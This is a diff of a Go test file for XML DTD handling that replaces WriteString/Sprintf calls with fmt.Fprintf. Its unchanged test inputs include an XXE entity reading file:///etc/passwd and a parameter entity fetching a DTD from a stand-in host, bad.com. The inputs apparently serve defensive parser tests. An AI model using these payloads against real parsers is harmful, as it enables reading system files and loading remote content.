@@ -255,7 +255,7 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 		var xmlData strings.Builder
 		xmlData.WriteString("<!DOCTYPE root [\n")
 		for i := 0; i < 500; i++ {
-			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+			fmt.Fprintf(&xmlData, "  <!ENTITY e%d \"value\">\n", i)
 		}
 		xmlData.WriteString("  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n")
 		xmlData.WriteString("]><root/>")
@@ -276,7 +276,7 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 		var xmlData strings.Builder
 		xmlData.WriteString("<!DOCTYPE root [\n")
 		for i := 0; i < 501; i++ {
-			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+			fmt.Fprintf(&xmlData, "  <!ENTITY e%d \"value\">\n", i)
 		}
 		xmlData.WriteString("]><root/>")
 
@@ -296,7 +296,7 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 		var xmlData strings.Builder
 		xmlData.WriteString("<!DOCTYPE root [\n")
 		for i := 0; i <= 501; i++ {
-			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+			fmt.Fprintf(&xmlData, "  <!ENTITY e%d \"value\">\n", i)
 		}
 		xmlData.WriteString("]><root>&e501;</root>")
 
@@ -312,7 +312,7 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 		var xmlData strings.Builder
 		xmlData.WriteString("<!DOCTYPE root [\n")
 		for i := 0; i < 500; i++ {
-			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+			fmt.Fprintf(&xmlData, "  <!ENTITY e%d \"value\">\n", i)
 		}
 		xmlData.WriteString("  <!ENTITY % pe SYSTEM \"http://bad.com/dtd\"> %pe;\n")
 		xmlData.WriteString("]><root/>")
@@ -333,7 +333,7 @@ func TestXMLDTD_OverflowDeclarations(t *testing.T) {
 		var xmlData strings.Builder
 		xmlData.WriteString("<!DOCTYPE root [\n")
 		for i := 0; i <= 10100; i++ {
-			xmlData.WriteString(fmt.Sprintf("  <!ENTITY e%d \"value\">\n", i))
+			fmt.Fprintf(&xmlData, "  <!ENTITY e%d \"value\">\n", i)
 		}
 		xmlData.WriteString("]><root>&e10100;</root>")
 
